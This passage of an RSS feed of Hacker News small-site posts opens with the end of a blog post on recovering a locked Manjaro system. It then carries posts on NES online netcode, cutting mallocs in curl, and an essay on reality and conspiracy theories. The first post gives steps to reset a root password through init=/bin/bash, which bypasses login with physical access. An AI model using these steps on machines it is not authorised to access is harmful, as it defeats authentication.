<p>Back to the newbie forums. Luckily I find someone with a similar problem. He was having trouble logging into rescue mode because he had never set the root password in the first place. Turns out the solution is to reset your root password without knowing your root password. I couldn‚Äôt believe how easy the process was.</p>
<p>Instead of appending <code>systemd.unit=rescue.target</code> to the kernel params, I appended <code>init=/bin/bash</code>. This tells the computer to run <code>/bin/bash</code> as init rather than the system init and puts you into a root shell without being prompted for a password. Your root file system is mounted as read-only now, so the first step is to mount it as read/write: <code>mount -n -o remount,rw /</code>. Then use <code>passwd</code> to create a new password for the root user, <code>reboot -f</code>, and you are good to go!</p>
<blockquote>
<p>If you want to ‚Äúfix‚Äù this, lock GRUB and your BIOS with a password and put your hard disk first in boot order. If someone else has physical access and can put the (non-encrypted) hard disk into another computer, you have lost anyway</p>
</blockquote>
<p>After that I was able to successfully boot into rescue mode and fix the problems with PAM. I did the following:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="bash"><span>cd</span> /etc/pam.d/
mv system-login system-login.backup
mv system-login.pacnew system-login
</code></pre></td></tr></tbody></table>
</div>
</div><p>One final reboot to the computer, and here I am!</p>

<p>I was late for my 10 oclock shutdown because of this, but thank god I‚Äôm back. This could have been quite a disaster; I‚Äôll be backing up my pc tomorrow.</p>
<p>This is the first time I‚Äôve ever had a ‚Äúbreaking change‚Äù with manjaro, but it was my fault and could have been prevented by reading the update notes. Live and learn.</p>
<p>Mentioned links:</p>
<ul>
<li><a href="https://unix.stackexchange.com/questions/34462/why-does-linux-allow-init-bin-bash" target="_blank" rel="noopener noreffer">Why does linux allow init bin bash</a></li>
<li><a href="https://forum.manjaro.org/t/cant-login-after-update/16231" target="_blank" rel="noopener noreffer">Can‚Äôt login after update</a></li>
<li><a href="https://forum.manjaro.org/t/stable-update-2020-08-28-kernels-systemd-pam-pambase-kde-git-deepin-pamac-nvidia-450-66-libreoffice-7-0/16146/2" target="_blank" rel="noopener noreffer">Update notes</a></li>
<li><a href="https://forum.manjaro.org/t/cannot-boot-to-rescue-mode-solved/25636" target="_blank" rel="noopener noreffer">Cannot boot to rescue mode solved</a></li>
</ul>
</div></div>]]>
            </description>
            <link>https://colekillian.com/posts/hacking-into-my-computer-after-getting-locked-out/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24592000</guid>
            <pubDate>Fri, 25 Sep 2020 17:19:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Decentralization: I Want to Believe (2014)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24591973">thread link</a>) | @anderspitman
<br/>
September 25, 2020 | http://adamierymenko.com/decentralization.html | <a href="https://web.archive.org/web/*/http://adamierymenko.com/decentralization.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://adamierymenko.com/decentralization.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591973</guid>
            <pubDate>Fri, 25 Sep 2020 17:17:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing Online in a NES Cartidge]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24591955">thread link</a>) | @threegrand
<br/>
September 25, 2020 | https://www.videogamesage.com/topic/762-super-tilt-bro-for-nes/page/2/?tab=comments#comment-86817 | <a href="https://web.archive.org/web/*/https://www.videogamesage.com/topic/762-super-tilt-bro-for-nes/page/2/?tab=comments#comment-86817">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-role="commentContent" data-controller="core.front.core.lightboxedImages">
			<p>
	<strong><span>Technical highlight:&nbsp;Real time online gaming with the NES</span></strong>
</p>

<p>
	Super Tilt Bro. is not a retro-game. It always tried to be a modern game on retro hardware, and modern games are playable online!
</p>

<p>
	We "simply" put a WiFi chipset in the cartridge, and let's rock! New millennium, here we come!
</p>

<p>
	<img alt="spacer.png" data-ratio="75.05" height="400" width="533" data-src="https://i.imgur.com/9yVPvJR.png" src="https://www.videogamesage.com/applications/core/interface/js/spacer.png"><br><span>A prototype of the WiFi cartridge by </span><a href="https://twitter.com/Broke_Studio" rel="external nofollow">@BrokeStudio</a><span>.</span>
</p>

<p>
	<span>Challenges of online gaming</span>
</p>

<p>
	Writing a game to be played online is not an easy task. At any time, we have to ensure that both players see the same scene. When the game is fast-paced, some milliseconds of ping can make a big difference.
</p>

<p>
	Let's assume Alice is playing against Bob. Bob unleashed his super-attack, and Alice dodged it on the last frame, EPIC! But, there is a ping of 20 milliseconds between Alice and Bob's houses (typical), and a frame lasts 16 milliseconds. Alice did actually dodge on time, so her game shows her character ready for a deadly counter-strike. Now, the information of Alice's epic dodge took 20 milliseconds to reach Bob's home, so Bob sees that Alice dodged too late, taking heavy damage. That's a typical case of desynchronization: the two players see a completely different outcome of their fight.
</p>

<p>
	<span><img alt="spacer.png" data-ratio="58.62" height="425" width="725" data-src="https://i.imgur.com/qYiVEbt.png" src="https://www.videogamesage.com/applications/core/interface/js/spacer.png"></span><br><span>Alice and Bob's different timelines. Everybody wins!</span>
</p>

<p>
	<span>The rollback netcode</span>
</p>

<p>
	Super Tilt Bro. is based on a rollback netcode. It does not wait to know opponent's inputs, it guesses it. When inputs finally come, the game discovers if its guess was right or wrong. A right guess is good. If the guess was wrong, the game rollbacks it's scene taking real inputs instead of guessed ones.
</p>

<p>
	What does it mean for the epic fight between Alice and Bob? Alice still dodges on time, her game shows it without problem. Bob's game begins to guess that Alice did not dodge (that was an epic dodge like we rarely see), so it begins to show the attack hitting. Then, less than 20 milliseconds after, the information arrives. The game rollbacks, Alice was never hit. There will typically be one frame of flicker (Alice is hit one frame, has dodged the next), but finally both players see the same action, and can continue to fight.
</p>

<p>
	<img alt="spacer.png" data-ratio="72.41" height="525" width="725" data-src="https://i.imgur.com/aPjRaAe.png" src="https://www.videogamesage.com/applications/core/interface/js/spacer.png"><br><span>The rollback engine, casually rewriting the past.</span>
</p>

<p>
	The guessing algorithm is super simple. It always guesses that nothing changed, no button was released nor pressed. For a game running at 60 FPS, even for a nervous player doing six inputs per second, this simple algorithm is right 90% of the time.
</p>

<p>
	<span>Adding some input lag</span>
</p>

<p>
	Another trick is to delay inputs while sending them immediately over the network. Let's say we artificially delay all inputs by four frames. If an input takes less than four frames to be transmitted from a player to another, rollback is not even necessary.
</p>

<p>
	Getting back to the game between Alice and Bob, but with an input lag of four frames. When Alice inputs the dodge on the last possible frame, it has no immediate effect, so she is hit hard. One or two frames later, Bob receives the network packet with the dodge input, it has not yet had any effect. Both players see the same action: Alice took the hit. It is less epic, but at least everybody sees the same thing and there is no visual glitch.
</p>

<p>
	<img alt="spacer.png" data-ratio="58.62" height="425" width="725" data-src="https://i.imgur.com/BV4ZBXG.png" src="https://www.videogamesage.com/applications/core/interface/js/spacer.png"><br>
	Input-lag: glitch-less, but frustrating at times.
</p>

<p>
	Of course, both approaches can be used together. That's what Super Tilt Bro. does. There is a little bit of input lag, which should be sufficient in most cases. In case of a latency spike the input lag may not be enough, the rollback code saves the day ensuring minimal glitch. In a nutshell, rollback makes your opponent teleport at the beginning of a move, input lag makes your character slow to react, a balance between both has to be found.
</p>

<p>
	<span>Some other implementations</span>
</p>

<p>
	All that is good, now you know how the Super Tilt Bro.'s netcode mitigates internet's latency. Most game developers just never openly discuss their netcode, while it is extremely interesting to see different approaches. Here are some known ones.
</p>

<p>
	Super Smash Bros, the direct inspiration for Super Tilt Bro. does not do the same thing. There is no rollback at all in the original series, instead the game slows down or even freezes waiting for inputs. It can be easily seen by playing on an unstable connection, the game will regularly freeze. To limit the impact of these slow downs, the input lag seems dynamic. (Yes, sorry for that "seem", most available info is reverse engineered or outright guessed.) We know for sure that Super Smash Bros Brawl rates your connection and attributes it an input lag that can vary from 3 frames for the best to 15 frames for the worst. People trying to measure input lag in Super Smash Bros Ultimate failed with online mode, the input lag was too varying. Maybe Ultimate is adjusting dynamically input lag for each player during the game.
</p>

<p>
	The approach of avoiding rollbacks and freezing the game has its benefits and drawbacks. First, it is really easy to implement, the only special case to handle is to wait for the needed information to be available. As a side effect, it requires very little overhead for the CPU and memory. The game engine does not have to be able to rollback from a previous point in time, the game can just run forward, forgetting anything that happened on previous frames. The effect on laggy connections is a freeze, while with a rollback netcode characters may teleport around on laggy connections. It is a matter of preference, a freeze is more "understandable", while a slight teleport is more smooth to play. The biggest problem is competitive play. Even at a moderate level, players train their combo, learning to execute moves with very precise timing (even frame-perfect sometimes). If the game slows down, freezes or changes the input lag in the middle of a frame-perfect combo, it messes it up, making it fail while player's execution is perfect. Finally, freezes must be avoided, it is not an option. So the player cannot be offered the choice to configure its input lag, it has to be conservative.
</p>

<p>
	Another well-known solution is GGPO. It is a standalone rollback netcode made to be used by developers on their own game. It is especially popular in arcade emulation, and is the solution of choice of Skull Girls (which is known to have a good netcode.) GGPO is a rollback engine, their documentation does not mention input lag, but Skull Girls allows it to be configured to a fixed number of frames. This way the player can balance himself between more rollbacks or more input lag.
</p>

<p>
	It is a lot like the Super Tilt Bro.'s netcode. The good thing is that input lag is fixed and constant for an entire game. You can still perform your frame-perfect combos. The biggest problem is when there is a big latency spike, characters will teleport around for a while until the game successfully re-synchronize itself with the other player. This kind of action is really confusing for the player. Also, the game engine has to take save-states and manage it to be able to rollback, putting pressure on the CPU and memory.
</p>

<p>
	All these modern implementations have something in common: they are peer-to-peer. Avoiding packets to transit by a server noticeably reduces latency. That's a really cool solution. Super Tilt Bro., however, is server based, let's see why.
</p>

<p>
	<span>Super Tilt Bro.'s game server</span>
</p>

<p>
	We saw that peer-to-peer is the best model for online versus fighting. Super Tilt Bro. does not have this luxury. We also saw that rollback netcodes are costly for the CPU as the game has to be able to rollback, and the RAM because it has to store its old states. The NES runs with a 8-bit CPU at 1.5 Mhz and 2 KB of RAM. It is really far from modern systems. Implementing the rollback system entirely on the NES would be very limiting, most resources would be allocated to it at the expense of gameplay. The server is here to help.
</p>

<p>
	Remember Alice and Bob? With the Super Tilt Bro.'s protocol, when Alice presses a button the game only sends the state of the gamepad and a timestamp to the server. The server knows the game, it is able to simulate frames, and compute the game's state at any point. Based on this knowledge and Alice's input, the server computes the state of the game at the frame of Alice's input, then sends all that to Bob. Bob receives the timestamp, Alice's input and a full game state. If input lag did its work, the game state can be ignored. If a rollback is needed, Bob's NES can use the state received from the server. Bob's NES does not have to manage a list of game states, the server generates it when needed, removing almost all pressure on the limited NES memory.
</p>

<p>
	The server can also help with CPU budget. Let's say there is always a minimum of two frames of delay between Alice and Bob. When receiving Alice's input, instead of computing the state at the time of the input, the server can compute the state two frames after. The server is actually predicting the future, avoiding Bob's NES to do it itself. Of course a full rollback engine has to also be implemented in the server, but can help a lot with big latencies. Currently, Super Tilt Bro. is able to rollback only three frames of gameplay before running out of time. The server doing the rollback for one or two frames can help a lot.
</p>

<p>
	<span>UDP vs TCP... And web browsers</span>
</p>

<p>
	There are two big, omnipresent protocols on the internet: UDP and TCP. TCP is the most common one, it allows a computer to connect to another and send data. In TCP land, we don't lose data, and data is received in the same order as it was sent. Most of the internet is constructed on TCP, it is simple to use. UDP is a more lightweight protocol. In UDP's world, when we send a packet, the only sure thing is that we sent it. The packet may be randomly lost, or arrive before a packet sent earlier. So, TCP is a better protocol, right? No. Sadly, TCP's magic has a cost.
</p>

<p>
	In Super Tilt Bro.'s protocol we don't care a lot about lost packets. A message from the server to a client contains a full game state. A recent message ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.videogamesage.com/topic/762-super-tilt-bro-for-nes/page/2/?tab=comments#comment-86817">https://www.videogamesage.com/topic/762-super-tilt-bro-for-nes/page/2/?tab=comments#comment-86817</a></em></p>]]>
            </description>
            <link>https://www.videogamesage.com/topic/762-super-tilt-bro-for-nes/page/2/?tab=comments#comment-86817</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591955</guid>
            <pubDate>Fri, 25 Sep 2020 17:16:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing mallocs in the curl codebase for fun]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24591920">thread link</a>) | @pcr910303
<br/>
September 25, 2020 | https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Everyone needs something fun to do in their spare time. And digging deep into curl internals is mighty fun!</p>



<p>One of the things I do in curl every now and then is to run a few typical command lines and count how much memory is allocated and how many memory allocation calls that are made. This is good project hygiene and is a basic check that we didn‚Äôt accidentally slip in a malloc/free sequence in the transfer path or something.</p>



<p>We have extensive memory checks for leaks etc in the test suite so I‚Äôm not worried about that. Those things we detect and fix immediately, even when the leaks occur in error paths ‚Äì thanks to our fancy ‚Äútorture tests‚Äù that do error injections.</p>



<p>The amount of memory needed or number of mallocs used is more of a <a href="https://en.wikipedia.org/wiki/Boiling_frog">boiling frog problem</a>. We add one now, then another months later and a third the following year. Each added malloc call is motivated within the scope of that particular change. But taken all together, does the pattern of memory use make sense? Can we make it better?</p>



<h2>How?</h2>



<p>Now this is easy because when we build curl debug enabled, we have a fancy logging system (we call it <em>memdebug</em>) that logs all calls to ‚Äúfallible‚Äù system functions so after the test is completed we can just easily grep for them and count. It also logs the exact source code and line number.</p>



<pre>cd tests
./runtests -n [number]
egrep -c 'alloc|strdup' log/memdump</pre>



<h2>Let‚Äôs start</h2>



<p>Let me start out with a look at the history and how many allocations (calloc, malloc, realloc or strdup) we do to complete test 103. The reason I picked 103 is somewhat random, but I wanted to look at FTP and this test happens to do an ‚Äúactive‚Äù transfer of content and makes a total of 10 FTP commands in the process.</p>



<p>The reason I decided to take a closer look at FTP this time is because I fixed an issue in the main ftp source code file the other day and that made me remember the <code>Curl_pp_send()</code> function we have. It is the function that sends FTP commands (and IMAP, SMTP and POP3 commands too, the family of protocols we refer to as the ‚Äúping pong protocols‚Äù internally because of their command-response nature and that‚Äôs why it has ‚Äúpp‚Äù in the name).</p>



<p>When I reviewed the function now with my malloc police hat on, I noticed how it made two calls to aprintf(). Our printf version that returns a freshly malloced area ‚Äì which can even cause several reallocs in the worst case. But this meant <em>at least </em>two mallocs per issued command. That‚Äôs a bit unnecessary, isn‚Äôt it?</p>



<h2>What about a few older versions</h2>



<p>I picked a few random older versions, checked them out from git, built them and counted the number of allocs they did for test 103:</p>



<pre>7.52.1: 141<br>7.68.0: 134<br>7.70.0: 137<br>7.72.0: 123</pre>



<p>It‚Äôs been up but it has gone down too. Nothing alarming, Is that a good amount or a bad amount? We shall see‚Ä¶</p>



<h2>Cleanup step one</h2>



<p>The function gets printf style arguments and sends them to the server. The sent command also needs to append CRLF to the data. It was easy to make sure the CRLF appending wouldn‚Äôt need an extra malloc. That was just sloppy of us to have there in the first place. Instead of mallocing the new printf format string with CRLF appended, it could use one in a stack based buffer. I landed that as a <a href="https://github.com/curl/curl/commit/0548ecaf6ac6fd8d81d63048d09ece8dbb715666">first commit</a>.</p>



<p>This trimmed off 10 mallocs for test 103.</p>



<h2>Step two, bump it up a notch</h2>



<p>The remaining malloc allocated the memory block for protocol content to send. It can be up to several kilobytes but is usually just a few bytes. It gets allocated in case it needs to be held on to if the entire thing cannot be sent off over the wire immediately. Remember, curl is non-blocking internally so it cannot just sit waiting for the data to get transferred.</p>



<p>I switched the malloc‚Äôed buffer to instead use a ‚Äòdynbuf‚Äô. That‚Äôs our internal ‚Äúdynamic buffer‚Äù system that was <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">introduced earlier this year</a> and that we‚Äôre gradually switching all internals over to use instead of doing ‚Äúcustom‚Äù buffer management in various places. <a href="https://github.com/curl/curl/blob/master/docs/DYNBUF.md">The internal API for dynbuf is documented here</a>.</p>



<p>The internal API <code>Curl_dyn_addf()</code> adds a printf()-style string at the end of a ‚Äúdynbuf‚Äù, and it seemed perfectly suitable to use here. I only needed to provide a <code>vprintf()</code> alternative since the printf() format was already received by <code>Curl_pp_sendf()</code>‚Ä¶ I created <code>Curl_dyn_vaddf()</code> for this.</p>



<p>This single dynbuf is kept for the entire transfer so that it can be reused for subsequent commands and grow only if needed. Usually the initial 32 bytes malloc should be sufficient for all commands.</p>



<h2>Not good enough</h2>



<p>It didn‚Äôt help!</p>



<p>Counting the mallocs showed me with brutal clarity that my job wasn‚Äôt done there. Having dug this deep already I wasn‚Äôt ready to give this up just yet‚Ä¶</p>



<p>Why? Because <code>Curl_dyn_addf()</code> was still doing a separate alloc of the printf string that it then appended to the dynamic buffer. But okay, having <a href="https://github.com/curl/curl/blob/master/lib/mprintf.c">our own printf() implementation</a> in the code has its perks.</p>



<h2>Add a printf() string without extra malloc</h2>



<p>Back in <a href="https://github.com/curl/curl/commit/ed35d6590e72c23c568af1e3b8ac6e4e2d883888#diff-8990ac09ce8abcb4f5e90a8f210ae11c">May 2020</a> when I introduced this dynbuf thing, I converted the aprintf() code over to use dynbuf to truly unify our use of dynamically growing buffers. That was a main point with it after all.</p>



<p>As all the separate individual pieces I needed for this next step were already there, all I had to do was to add a new entry point to the printf() code that would accept a dynbuf as input and write directly into that (and grow it if needed), and then use that new function (<code>Curl_dyn_vprintf</code>) from the Curl_dyn_addf().</p>



<p>Phew. Now let‚Äôs see what we get‚Ä¶</p>



<p>There are 10 FTP commands that previously did 2 mallocs each: 20 mallocs were spent  in this function when test 103 was executed. Now we are down to the ideal case of one alloc in there for the entire transfer.</p>



<h2>Test 103 after polish</h2>



<p>The code right now in master (to eventually get released as 7.73.0 in a few weeks), now shows <strong>a total of 104 allocations</strong>. Down from 123 in the previous release, which not entirely surprising is 19 fewer and thus perfectly matching the logic above.</p>



<p>All tests and CI ran fine. <a href="https://github.com/curl/curl/commit/675eeb1c941706070381faaad8ee1a5d75cff4a4">I merged it</a>. This is a change that benefits all transfers done with any of the ‚Äúping pong protocols‚Äù. And it also makes the code easier to understand!</p>



<p>Compared to curl 7.52.1, this is a 26% reduction in number of allocation; pretty good, but even compared to 7.72.0 it is still a 15% reduction.</p>



<h2>More?</h2>



<p>There is always more to do, but there‚Äôs also a question of diminishing returns. I will continue to look at curl‚Äôs memory use going forward too and make sure everything is motivated and reasonable. At least every once in a while.</p>



<p>I have some additional ideas for further improvements in the memory use area to look into. We‚Äôll see if they pan out‚Ä¶</p>



<p>Don‚Äôt count on me to blog about every such finding with this level of detail! If you want to make sure you don‚Äôt miss any of these fine-tunes in the future, follow <a href="https://github.com/curl/curl">the curl github repo</a>.</p>



<h2>Credits</h2>



<p>Image by <a href="https://pixabay.com/users/orzalaga-77630/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Julio C√©sar Vel√°squez Mej√≠a</a> from <a href="https://pixabay.com/?utm_source=link-attribution&amp;utm_medium=referral&amp;utm_campaign=image&amp;utm_content=1837434">Pixabay</a></p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/24/reducing-mallocs-for-fun/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591920</guid>
            <pubDate>Fri, 25 Sep 2020 17:12:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is This Real Life?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24591783">thread link</a>) | @jrdi
<br/>
September 25, 2020 | https://julian.digital/2020/09/25/is-this-real-life/ | <a href="https://web.archive.org/web/*/https://julian.digital/2020/09/25/is-this-real-life/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
 		
<p>In his bestselling book <a href="https://www.goodreads.com/book/show/23692271-sapiens">Sapiens</a>, Yuval Harari argues that humans became the dominating species of planet earth because we are the only animal that can cooperate in large numbers. This, he claims, is due to humans‚Äô ability to believe in purely imaginative things and concepts. A company like Google, for example, doesn‚Äôt <em>really</em> exist. Sure, there‚Äôs the Google.com website and physical Google offices with real Google employees ‚Äì but the idea of Google as a company is just a fictional concept. It only exists because multiple people believe in it. The same is true for legal systems, nations, religion or money. Every large human cooperation system is based on a fictional idea that only lives in our collective minds.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/09/qanon.gif" media="min-width: 600px">What Harari doesn‚Äôt discuss in his book is the extreme other end of this cognitive ability: Conspiracy theories. I‚Äôve been fascinated by <a href="https://reallifemag.com/this-is-not-a-game/">Jon Glover‚Äôs recent essay on QAnon</a>, in which he compares conspiracy theorizing to alternate-reality games. Participating in QAnon conspiracies, he says, feels like playing a real-life multiplayer game based on secret insider knowledge.</p>



<p>Social media has made conspiracy theorizing so addictive and immersive that the line between story and reality can become incredibly blurry. </p>



<p><i>‚ÄúA lot of these groups are like cults [‚Ä¶] They have beliefs that border on religiosity ‚Ä¶ And when you contradict them, it‚Äôs like telling them Jesus isn‚Äôt real.‚Äù</i></p>



<p>The religion analogy is interesting because it‚Äôs a perfect example of why fact checking as a countermeasure is useless. <a href="https://toolbox.google.com/factcheck/about">Google</a>, <a href="https://www.facebook.com/journalismproject/programs/third-party-fact-checking">Facebook</a> &amp; <a href="https://www.reuters.com/article/us-twitter-factcheck/with-fact-checks-twitter-takes-on-a-new-kind-of-task-idUSKBN2360U0?il=0">co</a> have all introduced fact checks and fake news labels to combat conspiracy theories. It‚Äôs naive to think that they will work.</p>



<p>Think about it: Science (which, you could argue, is also a form of fact checking) has been around for centuries trying to debunk most religious beliefs ‚Äì and yet religion still plays a major role in Western society. If entire education systems teaching millions of people about science haven‚Äôt worked, why do you think adding a small fact check disclaimer below a YouTube video would?</p>



<p>In fact ‚Äì as you would expect from a perfect alternate-reality game ‚Äì fact checks (and how to circumvent them) have <a href="https://twitter.com/elisethoma5/status/1303630697567928320">actually long been part of the game</a>.</p>



<p>It‚Äôs worth pointing out that science is also just another belief system. We laugh about <a href="https://en.wikipedia.org/wiki/Modern_flat_Earth_societies">flat earthers</a>, but how many people can actually explain why the world is round in a scientifically correct way? Most of us don‚Äôt <em>know</em> science, we <em>believe</em> in science.</p>



<center><img src="https://julian.digital/wp-content/uploads/2020/09/reality.gif"></center>



<p>What should give us hope though is the fact that many people believe in *both* science and religion despite their contradictions. This means that multiple realities can co-exist even when they are at odds with each other.</p>



<p>We don‚Äôt live in just one reality ‚Äì we switch between different realities (and play different characters within them). It‚Äôs a bit like <a href="https://en.wikipedia.org/wiki/Westworld_(TV_series)">Westworld</a>, where guests can explore different theme parks: Westworld, Shogunworld, Warworld, etc.</p>



<p>Similar to Westworld, it‚Äôs increasingly becoming more difficult to distinguish between what‚Äôs real and what isn‚Äôt. As Aaron Z. Lewis points out in his brilliant essay <a href="https://aaronzlewis.com/blog/2019/05/29/you-can-handle-the-post-truth/">You Can Handle the Post-Truth</a>, we have created a fragmented reality with hyper-realistic CGI influencers, bots, deepfakes, AI pretending to be humans and humans pretending to be AI. We don‚Äôt live in a single timeline with a single history, but in a variety of ‚Äú<em>contradictory reality bubbles</em>‚Äú.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/09/narrativeviolations.png"></p><p>Bruno Ma√ß√£es paints a similar picture in his excellent book <a href="https://www.goodreads.com/book/show/52914599-history-has-begun">History Has Begun</a>. America, he believes, is in the process of transforming into a new, post-liberal society, distinct from current Western civilization. It‚Äôs a society that has not only been heavily shaped by television but one where reality and fantasy overlap.</p>



<p>This transformation has been in the making for a while: Kennedy had the aura of a movie star and leveraged his image through the medium of television. Nixon created the first political soap opera with the Watergate scandal. And with Reagan an actual movie star moved into the White House.</p>



<p>Trump is the ultimate culmination of this trend. His entire presidency feels scripted. His tweets end with <a href="https://twitter.com/realdonaldtrump/status/1265819308699070464?lang=en">cliffhangers</a>. A House of Cards screenwriter would not have been able to come up with a better story.</p>



<p>Reagan and Arnold Schwarzenegger used the social capital and entertainment skills they acquired as actors to appear more likable and competent as politicians, but at least they tried to be politicians. Trump, on the other hand, uses politics as another stage for his acting performance.</p>



<p><em>‚ÄúAmericans see the world as an action movie‚Äù</em> Ma√ß√£es writes. I think this became especially apparent during the current covid-19 crisis and the most recent wildfires in California. People in my social media timelines seemed only superficially worried. Instead, their posts contained an underlying sense of excitement about real life finally catching up with the science fiction aesthetics of Blade Runner and Akira.</p>



<p>Perhaps this is Hollywood‚Äôs greatest achievement: It gets us excited about our dystopian future. The world might be ending, but at least it‚Äôs an ending that‚Äôs entertaining to watch.</p>



<p><iframe width="100%" height="348" src="https://www.youtube.com/embed/x_m9TUP_t_Y" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>



<p>If Hollywood created the fantasy worlds that reality is catching up with today, who is creating the fantasy worlds of tomorrow?</p>



<p>Ma√ß√£es thinks the answer is Silicon Valley, which he describes as <em>‚Äúa fantasy land where engineering talent and capital come together to power the serious project of creating new worlds out of nothing‚Äù</em>. It‚Äôs one of the most idiosyncratic descriptions of how startups work that I have read. VCs are the new Hollywood studios; founders are the directors and actors.</p>



<p>A founder‚Äôs job is essentially to create the most compelling narrative of what their company will look like in 10 to 20 years time. <a href="https://alexdanco.com/2020/09/17/are-founders-allowed-to-lie/">It‚Äôs not lying, it‚Äôs telling pre-truths</a>. Being contrarian just means that you came up with a novel fantasy plot no one else had thought of yet.</p>



<p>Sometimes founders are able to re-create the fantasy narratives of their pitch decks. Sometimes you end up with Theranos.</p>



<p>And even when you do end up with Theranos, at least you get material for an exciting new Netflix series. Perhaps VCs should buy the movie rights to the startups they invest in as a hedge against their biggest portfolio failures?</p>



<p>The concept of the tech industry as a creator of fantasy worlds immediately reminded me of a conversation I had with my friend <a href="https://twitter.com/cutler_max">Max</a> recently. His theory is that it‚Äôs not the lack of tech talent or venture capital that explains why Europe hasn‚Äôt been able to create a tech ecosystem on par with the US. It‚Äôs the absence of religiosity that has kept Europe from creating its own Google or Facebook. The US is able to create larger companies because it‚Äôs able to believe in larger and more ambitious narratives.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/09/escher.png"></p><p>Silicon Valley is not just creating new fantasy worlds, it is building tools that allow others to create their own fantasy worlds. Enter social media.</p>



<p>If TV has taught us to think of ourselves as characters in the story of our lives, then social media has allowed us to actually write and edit the script and build fictional characters. Social media is essentially the democratization of virtual world building.</p>



<p>As I wrote in <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, Twitter, Snapchat and Facebook are just massive virtual status arenas that allow us to build social capital through signaling. Some of that social capital might be built on top of real stories and actual achievements, but most of it is not based on reality. Every time you are applying an Instagram filter, you are already changing reality.</p>



<p>It‚Äôs not just that we bend reality in our social media narratives, we also play different characters. As <a href="https://www.youtube.com/watch?v=e3Zs74IH0mc">Chris Poole already pointed out</a> years ago, we all have multiple (online) identities. There is not just one reflection of yourself ‚Äì identity is prismatic. Twitter-Julian (armchair intellectual) is not the same as Instagram-Julian (hobby photographer) or Facebook-Julian (high-school drinking buddy). Google Circles and Facebook Lists always got this wrong: They let us change who we shared <em>with</em>, but not who we shared <em>as</em>.</p>



<p>This is why social networking is not a winner-take-all market. We need different channels for our different, contradicting online personas. </p>



<p>The problem is not that we live in multiple realities or that these realities are sometimes at odds with each other. What‚Äôs problematic is that we sometimes get so immersed in one virtual world, that we forget about all the other realities ‚Äì which brings us back to the problem of online conspiracies.</p>



<p>In Christopher Nolan‚Äôs Inception, Dom Cobb uses <a href="https://www.youtube.com/watch?v=XQPy88-E2zo">a spinning tractricoid top that tells him if he is awake or still dreaming</a>. You can think of the mechanisms I describe in <a href="http://julian.digital/2020/08/06/proof-of-x/">Proof of X</a> as social media‚Äôs equivalent of the spinning top. As <a href="https://nymag.com/intelligencer/2017/10/you-can-rent-a-grounded-private-jet-to-take-instagram-photos.html">influencers rent grounded private jets</a> to pretend living a billionaire lifestyle, social networks introduce new proof-of-work hurdles to make sure our status games remain grounded in truth. Proof of reality.</p>



<p>It feels like some of the new virtual realities we have created need more than that. A kill switch that automatically brings us back to base reality.</p>



<p>So if you have reached this point of my essay, perhaps now would be a good time to close your browser window and enjoy real life. Or at least <a href="https://www.simulation-argument.com/simulation.html">the closest simulation you have thereof</a>. </p>



<center><img src="https://julian.digital/wp-content/uploads/2020/09/spinning.gif"></center>







<p><em>Thanks to <a href="https://twitter.com/aaronzlewis">Aaron Z. Lewis</a>,  <a href="https://twitter.com/einkoenig">Jan K√∂nig</a> and <a href="https://twitter.com/cutler_max">Max Cutler</a> for reading drafts of this post. If you have thoughts on this essay, please leave them <a href="https://twitter.com/lehrjulian/status/1309492861474410496">here</a>.</em></p>
 	</div></div>]]>
            </description>
            <link>https://julian.digital/2020/09/25/is-this-real-life/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24591783</guid>
            <pubDate>Fri, 25 Sep 2020 16:57:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating an Entity-Component-System in C#]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24591650">thread link</a>) | @MH15
<br/>
September 25, 2020 | https://matthall.codes/blog/ecs/ | <a href="https://web.archive.org/web/*/https://matthall.codes/blog/ecs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
